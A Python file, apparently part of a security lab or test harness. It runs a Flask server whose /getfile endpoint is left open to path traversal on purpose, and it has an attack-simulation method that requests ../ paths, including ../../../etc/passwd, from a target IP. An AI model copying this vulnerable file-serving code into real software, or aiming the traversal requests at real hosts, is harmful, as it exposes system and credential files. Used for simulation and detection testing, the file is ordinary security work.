from flask import Flask, request, send_file 
import os
import urllib.request
import threading
from time import sleep
from werkzeug.serving import make_server

class WebServer(threading.Thread):
    """
    A simple Flask-based web server running inside its own thread.
    This class allows the server to be started, stopped, and used
    as part of simulated attack scenarios (e.g., path traversal).
    """
    def __init__(self):
        super().__init__()
        self.stop_event = threading.Event()
        self.app = Flask(__name__)
        self.server = None
        
        @self.app.route('/getfile')
        def download():
            """
            HTTP endpoint used to simulate a vulnerable file-download feature.
            It attempts to return a file from /var/www/files based on user input.
            This is intentionally insecure for attack simulation purposes.
            """

            try:
                filename = request.args.get('file')
                file_path = f"/var/www/files/{filename}"
                # Check whether the file exists and return it
                if os.path.isfile(file_path):
                    sending_msg = send_file(file_path)
                else:
                    sending_msg = "No file"
                
            except Exception as e:
                print(e)
            print(sending_msg)
            return sending_msg
        


    def run(self):
        """
        Starts the web server using Werkzeug's make_server().
        The server blocks inside serve_forever(), so it must run in a thread.
        """
        self.server = make_server("0.0.0.0", 5000, self.app)
        self.ctx = self.app.app_context()
        self.ctx.push()
        print("WebServer started")
        self.server.serve_forever()

    def shutdown(self):
        """
        Gracefully stops the Flask server by invoking Werkzeug's shutdown method.
        """
        print("Webserver shutdown")
        if self.server:
            self.server.shutdown()

    
    # ----------------------- Attack Simulation -----------------------
    def path_traversal(self, target_ip, duration):
        """
        Performs several intentionally vulnerable path traversal requests
        against a target web server, then sleeps for the remaining duration.

        Parameters:
            target_ip (str): IP of the target web server.
            duration (int): Time to wait after executing the attack.
        """

        # Various directory traversal attempts
        urllib.request.urlopen("http://"+target_ip+":5000/getfile?file=../").read()
        urllib.request.urlopen("http://"+target_ip+":5000/getfile?file=../../").read()
        urllib.request.urlopen("http://"+target_ip+":5000/getfile?file=../../../").read()
        urllib.request.urlopen("http://"+target_ip+":5000/getfile?file=../../../etc/passwd").read()
        print(f"sleep: {duration}")
        sleep(duration)

